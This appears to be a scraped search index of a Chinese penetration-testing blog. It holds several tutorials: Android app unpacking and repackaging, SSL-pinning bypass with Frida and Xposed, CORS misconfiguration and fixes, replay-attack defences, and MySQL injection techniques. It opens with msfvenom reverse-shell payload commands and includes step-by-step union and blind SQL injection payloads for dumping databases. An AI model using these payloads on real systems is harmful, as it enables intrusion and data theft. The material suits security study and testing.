On&gt; -f raw &gt; shell.php8. Aspmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp9. Aspxmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f aspx &gt; shell.aspx10. JSPmsfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp11. Warmsfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war12. Bashmsfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt;-f raw &gt; shell.sh13. Perlmsfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl14. Pythonmsfvenom -p python/meterpreter/reverser_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py","categories":[{"name":"内网","slug":"内网","permalink":"http://www.vkxss.top/categories/内网/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"http://www.vkxss.top/tags/内网渗透/"}]},{"title":"APP-Android脱壳的dex文件回编译APK","slug":"APP-Android脱壳的dex文件回编译APK","date":"2020-03-05T07:20:20.000Z","updated":"2020-05-04T17:43:24.737Z","comments":true,"path":"2020/03/05/APP-Android脱壳的dex文件回编译APK/","link":"","permalink":"http://www.vkxss.top/2020/03/05/APP-Android脱壳的dex文件回编译APK/","excerpt":"","text":"项目背景 脱壳回编译 一、脱壳获取DEX文件 二、反编译DEX文件 三、修复AndroidManifest.xml 四、重打包、并签名运行 项目背景 脱壳后拿到.dex文件后，如何重新打包APK并发布。 脱壳回编译 思路 脱壳拿到DEX —&gt; 替换smali源码 —&gt; 修复AndroidManifest.xml —&gt; 重打包 —&gt; 签名运行 一、脱壳获取DEX文件 上篇我们已经成功脱掉腾讯乐固的壳，得到5个dex文件，但只有两个dex文件包含核心代码文件，我们可以通过文件大小也可以看出，所以我们只需要使用baksmali反编译这个两个dex： 二、反编译DEX文件 对两个dex文件，分别改名classes.dex，classes2.dex。使用baksmali进行反编译。没有的话自行安装，我这里使用mobsf框架的baksmali.jar进行反编译： 命令#java -jar baksmali.jar /path/classes.dex 命令#java -jar baksmali.jar /path/classes2.dex 默认回输出一个out文件，并重命名文件名为smali，同样的操作，再生成一个并重命名文件名为smali_classes2。因为我们要与反编译apk的文件名要一致。 之前我们已将apk用apktool反编译，这里注意反编译时，加上-r的参数，不然apktool重打包会失败。-r参数的意思是不对资源文件进行编译。 加上 -r 参数反编译时，AndroidManifest.xml也是无法修改的。 我们不加-r 参数，再次反编译一次，替换刚才的AndroidManifest.xml文件。 一切准备就绪，开始修复AndroidManifest.xml文件 三、修复AndroidManifest.xml 修改AndroidManifest.xml中application中的android:name,这是apk的入口，因为壳已经去掉了，因此入口需要修改。怎么找呢？ 1、打开原包(加固之后的)，查看apk，查看classes.dex 使用jadx，在com.wrapper.proxyapplication.WrapperProxyApplication这里找这个入口信息。 2、修改AndroidManifest.xml文件中” application”节点”android:name”：(未修改之前) 3、删除腾讯相关so文件，那我们应该删除那些文件呢？我自己登陆腾讯移动应用安全平台，上传了一个apk做了一个对比，结果如下： 打开反编译文件的lib目录： 新增如下3个文件： 四、重打包、并签名运行 修改替换后，我们得到以下目录【标注的是修改之后的】: 使用apktool重新打包 签名方式太多了，这里用的是Android助手： 我们再次使用jadx反编译查看，是否成功：","categories":[{"name":"APP","slug":"APP","permalink":"http://www.vkxss.top/categories/APP/"}],"tags":[{"name":"APP渗透测试","slug":"APP渗透测试","permalink":"http://www.vkxss.top/tags/APP渗透测试/"}]},{"title":"APP-Android脱壳-FRIDA-DEXDump","slug":"APP-Android脱壳-FRIDA-DEXDump","date":"2020-02-28T07:18:29.000Z","updated":"2020-03-22T16:31:36.726Z","comments":true,"path":"2020/02/28/APP-Android脱壳-FRIDA-DEXDump/","link":"","permalink":"http://www.vkxss.top/2020/02/28/APP-Android脱壳-FRIDA-DEXDump/","excerpt":"","text":"0x01 项目背景 用jadx打开dex文件，对Java代码进行分析，发现这里只有一个Application类，所以这个APK应该是被加固了，使用腾讯的加固，无法直接分析Java代码。如下图所示： 0x02 Frida-脱壳环境准备： Frida服务端：Android-ARM64 Frida客户端：MAC 脱壳工具：FRIDA-DEXDump https://github.com/vkbiu/FRIDA-DEXDump 开始脱壳 第一步：Android测试机启动frida-server 第二步：MAC客户端执行python main.py 执行第二步的同时：启动准备的APP 默数三秒，脱好了。 打开对应的目录查看成功脱壳生成的dex文件。如下图所示： 再次利用Jadx，打开dex文件，便可对Java代码进行分析。 下篇介绍如何回编译脱壳后的dex","categories":[{"name":"APP","slug":"APP","permalink":"http://www.vkxss.top/categories/APP/"}],"tags":[{"name":"APP渗透测试","slug":"APP渗透测试","permalink":"http://www.vkxss.top/tags/APP渗透测试/"}]},{"title":"APP-Android抓包技巧","slug":"APP-Android抓包技巧","date":"2020-02-10T07:30:08.000Z","updated":"2020-03-22T16:32:00.339Z","comments":true,"path":"2020/02/10/APP-Android抓包技巧/","link":"","permalink":"http://www.vkxss.top/2020/02/10/APP-Android抓包技巧/","excerpt":"","text":"抓包出错排查思路 0x01 抓取HTTPS的数据包 使用Frida绕过SSL固定 使用XPOST绕过SSL双向校验 抓包出错排查思路 上面是大概的排查思路, 具体的细节可能有些差异。如果proxy带有证书校验, 且JustTrustMe绕不过去, 可能要自己重新根据该应用定制hook模块, 去绕过其本地证书校验, 但是大部分应用都能通过将证书安装为系统证书绕过。 0x01 抓取HTTPS的数据包使用Frida绕过SSL固定 项目背景：适用Burp抓app的包，当未开代理，APP联网正常抓包；开了代理，APP无法联网，抓包失败。 配置环境： PC端：MAC Android端：基于arm64 python：3.6 Frida安装： Frida安装分为两部分，PC端安装客户端和Android端安装服务器。 客户端安装：pip3.6 install frida执行frida-ps，验证是否安装成功。如下图所示，则表明frida客户端安装成功。 服务端安装：frida服务端版本应与客户端一致，因此需要先在PC中输入frida –version查看frida版本。如下图： 然后在https://github.com/frida/frida/releases 中下载对应的服务端版本。注意我们还得查看模拟器或测试机架构，下载对应的版本。命令#： adb shell getprop ro.product.cpu.abi 本文环境应下载frida-server-12.8.11-android-arm64.xz，下载之后解压，并将frida-server-12.8.11-android-arm64传到Android端，命令为：adb push frida-server-12.8.11-android-arm64 /data/local/tmp/frida-server，如下图： 下一步就是执行frida-server，普通用户没有权限，需要su切换到root用户，然后到/data/local/tmp/路径下，对frida-server添加执行权限，执行chmod 777 frida-server，再执行./frida-server运行服务端frida。确认是否安装成功，在PC端执行frida-ps -U，如果列出设备上所有正在运行的进程，则代表安装成功。 或者查看frida对应的端口是否启动,端口 27042 命令：adb shell netstat -tulnp 设置代理： 设置模拟器代理或测试机代理 设置-无线网络-wifi-修改网络-代理 代理一般设置为出网ip， 然后burp设置同样的IP和端口 安装burp证书： 1.启动burp，保持默认代理不变，打开浏览器，设置浏览器代理，访问 2.点击右上角下载证书，改名为burpca-cert-der.crt 3.把证书导入模拟器或测试机: 命令：adb push burpca-cert-der.crt /data/local/tmp/cert-der.crt 到模拟器或测试机文件管理的对应路径双击导入证书,安装证书时，随意命名。 开启绕过： 将 fridascript.js hook 到目标应用程序中命令：frida -U 包名 -l frida-android-repinning.js –no-pause 使用XPOST绕过SSL双向校验 项目背景：在做安卓APP抓包测试的时候，发现有些APP会对https流量做SSL证书的强校验。 绕过证书强校验，可以利用hook的方式，将应用及系统中验证https证书的逻辑全部hook为验证结果正确，这样无论安装的证书是否有效，皆可进行正常的https通信。这里就需要对手机安装hook框架，这里用到的hook框架为Xposed。 官方下载地址：http://repo.xposed.info/module/de.robv.android.xposed.installer这里需要注意的是，安装Xposed，需要root权限，在Android4.0-4.4是可以直接通过安装apk的方式开刷入Xposed框架，而在Android 5.0以上则需要刷入Xposted的固件包。下载地址如下：https://dl-xda.xposed.info/framework/点击SDK23，发现有两种文件，其中.asc文件是 .zip文件的GPG签名，直接下载.zip文件安装即可。 SDK —- Android固件—- SDK21 Android 5.0 SDK22 Android 5.1 SDK23 Android 6.0 SDK24 Android 7.0 SDK25 Android 7.1 SDK26 Android 8.0 SDK27 Android 8.1 同时我放在了百度网盘方便下载： Xposed安装器下载地址 安卓5.0版本以下下载地址： 链接:https://pan.baidu.com/s/163hAuiRivx7k9kBxXSV5iw 密码:b7j3 安卓5.0版本以上下载地址： 链接:https://pan.baidu.com/s/1nBLHX7fGFOgOWncPwrOd4w 密码:umpq JustTrustMe Relese.2版本下载地址： 链接:https://pan.baidu.com/s/1tVDCQEPA5VH9cj-ajLOzSA 密码:qzv5 JustTrustMe Relese.3版本下载地址： https://github.com/vkbiu/DroidSSLUnpinning 安装完成效果如下： 想要进行https抓包的话需要安装Xposed的一个开源模块–JustTrustMe，安装进手机，在Xposted中激活并重启手机，这时就可以随意抓取手机中的流量了。","categories":[{"name":"APP","slug":"APP","permalink":"http://www.vkxss.top/categories/APP/"}],"tags":[{"name":"APP渗透测试","slug":"APP渗透测试","permalink":"http://www.vkxss.top/tags/APP渗透测试/"}]},{"title":"APK签名技巧记录","slug":"APP-APK签名技巧记录","date":"2020-02-08T07:30:08.000Z","updated":"2020-03-22T16:28:46.602Z","comments":true,"path":"2020/02/08/APP-APK签名技巧记录/","link":"","permalink":"http://www.vkxss.top/2020/02/08/APP-APK签名技巧记录/","excerpt":"","text":"0X01 APK签名工具 0X02 APK如何签名 0X01 APK签名工具 传统签名工具：jarsigner、apksigner 推荐一个非常nice的工具：https://github.com/vkbiu/uber-apk-signer 优点： 支持一键新签名、重签名 支持一键批量签名 支持 v1, v2, v3 签名 0X02 APK如何签名 命令：java -jar uber-apk-signer-1.1.0.jar -a ../path/rxt_debug.apk -o ../path/rxt_debug_1.apk –allowResign 签名结束， rxt_debug_1.apk目录下生成rxt_debug-aligned后缀的apk，就是使用默认签名签名后的文件，已经可以正常安装了。 我们再次验证下签名","categories":[{"name":"APP","slug":"APP","permalink":"http://www.vkxss.top/categories/APP/"}],"tags":[{"name":"APP渗透测试","slug":"APP渗透测试","permalink":"http://www.vkxss.top/tags/APP渗透测试/"}]},{"title":"Java代码审计-CORS","slug":"代码审计-Java-CORS","date":"2020-02-05T06:15:29.558Z","updated":"2020-03-04T16:51:47.561Z","comments":true,"path":"2020/02/05/代码审计-Java-CORS/","link":"","permalink":"http://www.vkxss.top/2020/02/05/代码审计-Java-CORS/","excerpt":"","text":"0x01、 问题背景公司的项目需要前后端分离，vue+java，这时候就需要支持Cors跨域请求了.0x001 什么是Cors?CORS 全称是跨域资源共享（Cross-Origin Resource Sharing），是一种 AJAX 跨域请求资源的方式，支持现代浏览器，IE支持10以上。 CORS与JSONP的使用目的相同，但是比JSONP更强大。JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。 简单来说Cors就是用来解决跨域问题的。此外解决的方式还有：Nginx反向代理，Jsoup等方式。不过Nginx不符合Devops理念，不易维护，而Jsoup支持的请求类型只支持Get请求。Cors更为适合；0x002 什么是跨域？同源就是指：域名，协议，端口 均相同 跨域就是指： 域名，协议，端口 其中至少有一个是不同的； 当前端请求后端接口的时候，当端口号，ip地址等不一致的时候，为了安全性考量，请求所响应的数据不会被前端展示。等于请求的数据没有被标识为友军，没有被证明是敌是友； ajax请求才会出现跨域0x003 Cors能解决什么问题？通过在服务端配置Cors相关的东西，能识别是否给予跨域权限，然后给予能跨域的标识，通过此标识，浏览器就可以渲染返回来的数据啦~~0x02案例一. Cors在SpringCloud微服务中的使用；0x001 环境：JDK1.8 IDEA SpringCloud微服务 网关使用Zuul0x002 代码：1234567891011121314151617181920212223242526272829package com.leyou.gateway.config;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.web.cors.CorsConfiguration;import org.springframework.web.cors.UrlBasedCorsConfigurationSource;import org.springframework.web.filter.CorsFilter;@Configurationpublic class CorsConfiguration &#123; @Bean public CorsFilter corsFilter()&#123; //配置初始化对象 CorsConfiguration configuration=new CorsConfiguration(); //允许跨域的域名，如果要携带cookie，不能写* 。 *：代表所有的域名都可以访问 configuration.addAllowedOrigin(&quot;http://localhost:9001&quot;); configuration.setAllowCredentials(true); configuration.addAllowedMethod(&quot;*&quot;); //代表所有的请求方法 configuration.addAllowedHeader(&quot;*&quot;); //允许携带任何头信息 //初始化cors配置源对象 UrlBasedCorsConfigurationSource configurationSource=new UrlBasedCorsConfigurationSource(); configurationSource.registerCorsConfiguration(&quot;/**&quot;,configuration); //返回corsFilter实例，参数:cors配置源对象 return new CorsFilter(configurationSource); &#125;&#125; 0x003 什么是zuul微服务网关： https://www.jianshu.com/p/29e9c91e3f3e https://www.jianshu.com/p/7bc06a64519b 0x03 【HTTP header】【【Access-Control-Allow-Credentials】跨域Ajax请求时是否带Cookie的设置 前端发起AJAX请求都会受到同源策略（CORS）的限制。发起AJAX请求的方法： 1234第一个是原生方法 XMLHttpRequest第二个是jQuery封装的 JQuery的$.ajax第三个是fetch是专门封装的库 Fetch第四个是axios 前端在发起AJAX请求时，同域或者直接访问的情况下，因为没有跨域的需求，所以Request的Header中的Origin为空。此时，如果后端代码是response.setHeader(“Access-Control-Allow-Origin”, origin)，那么Response的header中不会出现Access-Control-Allow-Origin，因为Origin为空。 注意当我们的客户端和服务端交互的时候使用的是 token，通过 Authorization头发送到服务端，并没有使用到 cookie时，所以客户端没有必要设置 withCredentials: true 0x001 无Cookie跨域Ajax请求 客户端 123456789- 以 jQuery 的 ajax 为例：$.ajax(&#123; url : &apos;http://remote.domain.com/corsrequest&apos;, data : data, dataType: &apos;json&apos;, type : &apos;POST&apos;, crossDomain: true, contentType: &quot;application/json&quot;, // POST时必须主要注意的是参数 crossDomain: true。发送Ajax时，Request header中会包含跨域的额外信息，但不会含cookie。 服务器端 跨域的允许主要由服务器端控制。服务器端通过在响应的 header 中设置 Access-Control-Allow-Origin 及相关一系列参数，提供跨域访问的允许策略。 1234567891011以Java为例：/*** Spring Controller中的方法：*/ @RequestMapping(value = &quot;/corsrequest&quot;) @ResponseBody public Map&lt;String, Object&gt; mainHeaderInfo(HttpServletResponse response) &#123; response.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;); ... &#125; 通过在响应 header 中设置 星号 来允许来自所有域的跨域请求访问。 1response.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;); 只允许来自特定域 http://my.domain.cn:8080 的跨域访问 1response.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;http://my.domain.cn:8080&quot;); 较灵活的设置方式，允许所有包含 mydomain.com 的域名访问.从安全的角度去考虑，并不建议使用，因为攻击者很容易绕过。 12if(request.getHeader(&quot;Origin&quot;).contains(&quot;mydomain.com&quot;)) &#123; response.setHeader(&quot;Access-Control-Allow-Origin&quot;, request.getHeader(&quot;Origin&quot;)); 0x002 带Cookie的跨域Ajax请求 客户端 1234567891011$.ajax(&#123; url : &apos;http://remote.domain.com/corsrequest&apos;, data : data, dataType: &apos;json&apos;, type : &apos;POST&apos;, xhrFields: &#123; withCredentials: true &#125;, crossDomain: true, contentType: &quot;application/json&quot;, 通过设置 withCredentials: true ，发送Ajax时，Request header中便会带上 Cookie 信息。 服务器端 相应的，对于客户端的参数，服务器端也需要进行设置： 123456789* Spring Controller中的方法： @RequestMapping(value = &quot;/corsrequest&quot;) @ResponseBody public Map&lt;String, Object&gt; getUserBaseInfo(HttpServletResponse response) &#123; if(request.getHeader(&quot;Origin&quot;).contains(&quot;woego.cn&quot;)) &#123; response.setHeader(&quot;Access-Control-Allow-Origin&quot;, request.getHeader(&quot;Origin&quot;)); &#125; response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;); ... 对应客户端的 xhrFields.withCredentials: true 参数，服务器端通过在响应 header 中设置 Access-Control-Allow-Credentials = true 来运行客户端携带证书式访问。通过对 Credentials 参数的设置，就可以保持跨域 Ajax 时的 Cookie。这里需要注意的是： 12服务器端 Access-Control-Allow-Credentials = true时，参数Access-Control-Allow-Origin 的值不能为 &apos;*&apos; 。 0x04 Nginx导致Cors及修复方案 存在漏洞配置： 123456789add_header Access-Control-Allow-Origin *;add_header Access-Control-Allow-Methods GET,POST,PUT,DELETE,OPTIONS;add_header &apos;Access-Control-Allow-Credentials&apos; &apos;true&apos;;oradd_header &apos;Access-Control-Allow-Origin&apos; &quot;$http_origin&quot;;add_header Access-Control-Allow-Methods GET,POST,PUT,DELETE,OPTIONS;add_header &apos;Access-Control-Allow-Credentials&apos; &apos;true&apos;; 修复方案需要限制origin： 12add_header &apos;Access-Control-Allow-Origin&apos; https://test.joychou.org;add_header &apos;Access-Control-Allow-Origin&apos; http://test.joychou.org;","categories":[{"name":"JAVA","slug":"JAVA","permalink":"http://www.vkxss.top/categories/JAVA/"}],"tags":[{"name":"Java代码审计","slug":"Java代码审计","permalink":"http://www.vkxss.top/tags/Java代码审计/"}]},{"title":"java通过sign签名+时间戳的方式防止rest接口被恶意抓包调用和重放（转）","slug":"APP-验签名与重放","date":"2020-01-16T08:10:57.352Z","updated":"2020-01-19T07:37:14.458Z","comments":true,"path":"2020/01/16/APP-验签名与重放/","link":"","permalink":"http://www.vkxss.top/2020/01/16/APP-验签名与重放/","excerpt":"","text":"java通过sign签名+时间戳的方式防止rest接口被恶意抓包调用和重放 要避免接口被恶意利用，我们可以在网关连接器进行验签的操作，也就是sign。但是攻击者还可以重放数据包，那具体应该要怎么做呢？下面我提供3个方法，供大家参考。同时再此记录下，方便翻阅。 https://blog.csdn.net/u014270696/article/details/97372584 方法1：请求接口的参数中添加时间戳 具体实现原理：每次客户端发送请求时，获取当前时间戳，当参数一同发送到服务器，服务器拦截该请求，获取服务器上当前时间戳和客户端请求中的时间戳进行比较，如果两个时间戳相差超过60s的话就认定为非法请求，因为一般一次正常的http请求发送到服务器不会超过60秒，所以可以这样做。 这样可以做到简单的防重放，但是并不能 真的解决重放的问题，时间戳如果被修改为当前时间戳的话。那这种方式就失效了。 这时候就需要另外一种方式了 方法2：请求接口的参数中添加sign签名 具体实现原理：使用签名验证，保证每次请求时候签名只能使用一次。 客户端和服务器端约定一个生成签名串的算法，可以由客户端ip+加密密钥+当前时间戳进行MD5加密生成，前端生成签名串后，跟随参数一起发送到后台解密，并将该签名串保存在redis中，下次请求的时候，先在redis中取查找是否有该签名串，如果有，则说明是非正常请求，这时候就可以认定为非法操作。 但是这样也会存在一个问题，也就是随着时间的推移，redis中会保存越来越多的这样的sign签名，对于服务器资源消耗是一笔不小的开销，这时候需要是我们去清理了，当然我们可以选择给每个sign设定一个过期时间，让他自动清理，比如说设置1天的有效时长，这样当天就不能使用这个sign来请求了，但是一天后还是可以继续使用。这样也有隐患。这时候可以结合时间戳验证和sign签名验证。 方法3：请求接口的参数中添加sign签名+时间戳（推荐） 具体实现原理：客户端生成MD5加密签名串，和当前时间戳跟随请求的参数一起发送到后台，后台获取签名进行解密，然后保存到redis中并设置一个失效时长（60s），则60s内不能使用相同的sign发送请求，然后获取系统当前时间戳和前端发送过来的时间戳做比较，如果两者相差超过60s，则认定为非法操作。 这种方式既能保证防止请求重放，又能有效节省服务器资源，推荐使用。 Java 代码层","categories":[{"name":"APP","slug":"APP","permalink":"http://www.vkxss.top/categories/APP/"}],"tags":[{"name":"APP渗透测试","slug":"APP渗透测试","permalink":"http://www.vkxss.top/tags/APP渗透测试/"}]},{"title":"MYSQL注入总结","slug":"渗透测试-MYSQL注入总结","date":"2020-01-05T07:30:08.000Z","updated":"2020-05-11T03:44:15.295Z","comments":true,"path":"2020/01/05/渗透测试-MYSQL注入总结/","link":"","permalink":"http://www.vkxss.top/2020/01/05/渗透测试-MYSQL注入总结/","excerpt":"","text":"0x01 Mysql简介 Mysql数据库结构 0x02 MySQL注入常用函数 常用函数 MySQL运算符 0x03 注入常用表、目标字段 可查字段 0x04 Mysql相关 0x05 Mysql注入 联合查询注入 无回显 盲注 bool盲注 时间盲注 报错注入 Xpath语法错误-updatexml() Xpath语法错误-extractvalue() floor()报错注入 exp()报错注入 Bigint数值操作 不存在的函数 列名重复-name_const() join using()注列名 GTID相关函数 二次注入 涉及函数 漏洞原理 题目实战 堆叠注入 涉及字符 原理分析 宽字节注入 涉及函数 漏洞原因 异或注入 涉及符号 原理分析 0x01 Mysql简介 MySQL是一个关系型数据库管理系统，由瑞典 MySQL AB 公司开发，目前属于 Oracle 公司。MySQL 是一种关联数据库管理系统，关联数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。 MySQL是开源的，所以你不需要支付额外的费用。 MySQL使用标准的 SQL 数据语言形式。 MySQL可以运行于多个系统上，并且支持多种语言。这些编程语言包括 C、C++、Python、Java、Perl、PHP、Eiffel、Ruby 和 Tcl 等。 MySQL对PHP有很好的支持，PHP 是目前最流行的 Web 开发语言。 MySQL支持大型数据库，支持 5000 万条记录的数据仓库，32 位系统表文件最大可支持 4GB，64 位系统支持最大的表文件为8TB。 MySQL是可以定制的，采用了 GPL 协议，你可以修改源码来开发自己的 MySQL 系统。 那么就有人问了，什么是关系型数据库？所谓关系型数据库，就是是依据关系模型来创建的数据库。所谓关系模型是我们生活中能经常遇见的模型，存储这类数据一般用关系型数据库。比如一个老师对应多个学生的数据（“多对多”），一本书对应多个作者（“一对多”），一本书对应一个出版日期（“一对一”）。 常见的关系型数据库： Oracle、DB2、PostgreSQL、Microsoft SQL Server、Microsoft Access、MySQL 关系型数据库的特点： 安全（因为存储在磁盘中，不会说突然断电数据就没有了）、容易理解（建立在关系模型上）、但不节省空间（因为建立在关系模型上，就要遵循某些规则，好比数据中某字段值即使为空仍要分配空间） 反之就有非关系型数据库，非关系型数据库主要是基于“非关系模型”的数据库（由于关系型太大，所以一般用“非关系型”来表示其他类型的数据库）， 非关系型模型比如有： 列模型：存储的数据是一列列的。关系型数据库以一行作为一个记录，列模型数据库以一列为一个记录。（这种模型，数据即索引，IO很快，主要是一些分布式数据库） 键值对模型：存储的数据是一个个“键值对”，比如name:liming,那么name这个键里面存的值就是liming 文档类模型：以一个个文档来存储数据，有点类似“键值对” 常见非关系模型数据库： 列模型：Hbase 键值对模型：redis,MemcacheDB 文档类模型：mongoDB 非关系型数据库的特点： 效率高（因为存储在内存中）、但不安全（断电丢失数据，但其中redis可以同步数据到磁盘中），现在很多非关系型数据库都开始支持转存到磁盘中。 Mysql数据库结构 库名 功能 mysql 保存有账户信息、权限信息、存储过程等 sys 包含了一系列的存储过程、自定义函数等 information_schema 保存着MySQL服务器所维护的所有其他数据库信息。如数据库名，数据库表等 performance_schema 收集数据库服务器性能参数 这些MySQL内置的数据库对注入帮助巨大。 0x02 MySQL注入常用函数常用函数 函数名称 函数功能 mysql 保存有账户信息、权限信息、存储过程等 system_user() 系统用户名 user() 用户名 current_user() 当前用户名 session_user() 连接数据库的用户名 database() 数据库名 version() 数据库版本 @@datadir 数据库路径 @@basedir 数据库安装路径 @@version_complie_os 操作系统 count() 返回执行结果的数量 concat() 没有分割地连接字符串 concat_ws() 含有分隔符地连接字符串 group_concat() 连接一个组的所有字符串，并以逗号分隔每一条数据 load_file() 读取本地文件 into outfile 写文件 ascii() 字符串的ASCII代码值 ord() 函数返回字符串第一个字符的 ASCII 值 mid() 返回字符串的一部分 substr() 返回字符串的一部分 length() 返回字符串的长度 left() 返回字符串最左面的几个字符 floor() 返回小于等于x的最大整数 rand() 返回0至1之间的一个随机数 extractvalue() 第一个参数：XML文档对象名称；第二个参数：Xpath格式的字符串。 作用：从目标XML中返回包含所查询值的字符串 updatexml() 第一个参数：XML文档对象名称；第二个参数：Xpath格式字符串；第三个参数：string格式。作用：改变符合条件的节点的值 sleep() 让此语句运行N秒钟 if() select if(1&gt;2,2,3) 返回 3 char() 返回整数所对应的ASCII码字符组成的字符串 exp() 返回e的n次方 MySQL运算符 符号 作用 IS NULL 为空 IS NOT NULL 不为空 BETWEEN AND 在···之间 IN 包含 NOT IN 不包含 LIKE 模式匹配 NOT LIKE 模式匹配 REGEXP 正则表达式 0x03 注入常用表、目标字段可查字段 schema information_schema.COLUMNS -&gt; TABLE_SCHEMA information_schema.KEY_COLUMN_USAGE -&gt; CONSTRAINT_SCHEMA, TABLE_SCHEMA, REFERENCED_TABLE_SCHEMA information_schema.PARTITIONS -&gt; TABLE_SCHEMA information_schema.SCHEMATA -&gt; SCHEMA_NAME information_schema.STATISTICS -&gt; TABLE_SCHEMA information_schema.TABLES -&gt; TABLE_SCHEMA information_schema.TABLE_CONSTRAINTS -&gt; CONSTRAINT_SCHEMA, TABLE_SCHEMA mysql.INNODB_INDEX_STATS -&gt; database_name mysql.INNODB_TABLE_STATS -&gt; database_name table information_schema.COLUMNS -&gt; TABLE_NAME information_schema.KEY_COLUMN_USAGE -&gt; TABLE_NAME, REFERENCED_TABLE_NAME information_schema.PARTITIONS -&gt; TABLE_NAME information_schema.STATISTICS -&gt; TABLE_NAME information_schema.TABLES -&gt; TABLE_NAME information_schema.TABLE_CONSTRAINTS -&gt; TABLE_NAME mysql.INNODB_INDEX_STATS -&gt; table_name mysql.INNODB_TABLE_STATS -&gt; table_name column information_schema.COLUMNS -&gt; COLUMN_NAME information_schema.KEY_COLUMN_USAGE -&gt; COLUMN_NAME, REFERENCED_COLUMN_NAME information_schema.STATISTICS -&gt; COLUMN_NAME mysql的查询语句完整格式如下： 1234567891011121314151617181920212223SELECT [ALL | DISTINCT | DISTINCTROW ] [HIGH_PRIORITY] [STRAIGHT_JOIN] [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] select_expr [, select_expr ...] [FROM table_references [PARTITION partition_list] [WHERE where_condition] [GROUP BY &#123;col_name | expr | position&#125; [ASC | DESC], ... [WITH ROLLUP]] [HAVING where_condition] [ORDER BY &#123;col_name | expr | position&#125; [ASC | DESC], ...] [LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;] [PROCEDURE procedure_name(argument_list)] [INTO OUTFILE &apos;file_name&apos; [CHARACTER SET charset_name] export_options | INTO DUMPFILE &apos;file_name&apos; | INTO var_name [, var_name]] [FOR UPDATE | LOCK IN SHARE MODE]] 0x04 Mysql相关 在MySQL 5+版本后，加入了information_schema这个库，该库存放了所有数据库的信息，记录当前数据库的数据库，表，列，用户权限等信息 information_schema.schemata包含所有数据库的名 字段 schema_name 数据库名 information_schema.tables包含所有库的表名 字段 table_schema 数据库名 table_name 表名 information_schema.columns包含所有表的字段 字段 table_schema 数据库名 table_name 表名 column_name 列名 0x05 Mysql注入联合查询注入 执行SQL查询，其结果能回显到页面中，那么可直接进行有回显的SQL注入，我们通常使用联合查询注入法 其作用就是，在原来查询条件的基础上，通过系统关键字union从而拼接上我们自己的select语句，后个select得到的结果将拼接到前个select的结果后边。如：前个select得到2条数据，后个select得到1条数据，那么后个select的数据将作为第3条拼接到第一个select返回的内容中，其字段名将按照位置关系进行继承。 如： 正常查询语句 union select columns_name from (database.)table_name where condition 这里需要注意的是： 若回显仅支持一行数据的话，记得让前边正常的查询语句返回的结果为空。 使用union select进行拼接时，注意前后两个select语句的返回的字段数必须相同，否则无法拼接。 union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=database()) --+ 联合查询注入步骤 1234567891011121314151617181920212223242526272829303132//查询语句$id=$_GET[&apos;id&apos;]; SELECT * FROM test WHERE id=&apos;$id&apos; LIMIT 0,1;//判断字段数?id=1&apos; ORDER BY 3--+//判断显示位?id=-1&apos; UNION SELECT 1,2,3--+//利用函数获得信息?id=-1 UNION SELECT 1,(version()),3--+//爆库?id=-1&apos; UNION SELECT 1,(SELECT schema_name FROM information_schema.schemata LIMIT 0,1),3--+ //用LIMIT来定位查询，一个一个爆数据库?id=-1&apos; UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--+ //用group_concat()实现一个显示位爆出该字段下所有记录；注：group_concat函数是要连接的字段//爆表?id=-1&apos; UNION SELECT 1,(SELECT table_name FROM information_schema.tables WHERE table_schema=&apos;security&apos; LIMIT 0,1),3--+//爆字段?id=-1&apos; UNION SELECT 1,(SELECT column_name FROM information_schema.columns WHERE table_schema=&apos;security&apos; AND table_name=&apos;users&apos; LIMIT 0,1),3--+//爆数据?id=-1&apos; UNION SELECT 1,(SELECT username FROM security.users LIMIT 0,1),3--+ 无回显 什么叫无回显？之前举得登录判断就是一个无回显的例子。如果SQL语句存在返回的数据，那么页面输出为success，若不存在返回的数据，则输出fail。 与有回显情况不同的是：无回显的页面输出内容并不是SQL语句返回的内容。 对于无回显的情况，我们通常可用两种方法进行注入：报错注入与盲注。 盲注bool盲注 如果既没有可控回显点，也没有报错信息，但是页面有正常和异常两种显示，我们就可以构造查询，通过页面状态判断猜解是否正确，其实是爆破的一种类型，本质上是一个字符一个字符的猜解，常用函数： 1、LENGTH(s): 返回字符串 s 的长度 2、LEFT(s,n)：返回字符串 s 的前 n 个字符 3、ASCII(s)：返回字符串 s 的第一个字符的 ASCII 码 4、SUBSTR(s, start, length)：从字符串 s 的 start 位置截取长度为 length 的子字符串 5、MID、SUBSTR、SUBSTRING 一样 简单例子： 1231&apos; and (length(database()))&gt;10;1&apos; and ascii(substr((select database()),1,1)&gt;144;1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;60; 时间盲注 